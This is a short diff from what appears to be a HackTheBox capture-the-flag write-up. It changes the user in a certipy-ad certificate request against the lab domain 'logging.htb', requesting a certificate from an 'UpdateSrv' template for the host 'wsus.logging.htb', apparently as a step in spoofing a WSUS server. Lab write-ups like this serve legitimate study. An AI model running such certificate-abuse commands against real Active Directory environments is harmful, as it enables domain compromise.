@@ -782,7 +782,7 @@ First ill add the record with my IP address on it
 
 ```python
 ❯❯❯ faketime -f +7h certipy-ad req \
-    -u 'attacker@corp.local' -k -no-pass \
+    -u 'jaylee.clifton@logging.htb' -k -no-pass \
     -dc-ip '10.129.245.130' -target 'dc01.logging.htb' \
     -ca 'logging-DC01-CA' -template 'UpdateSrv' \
     -dns 'wsus.logging.htb'
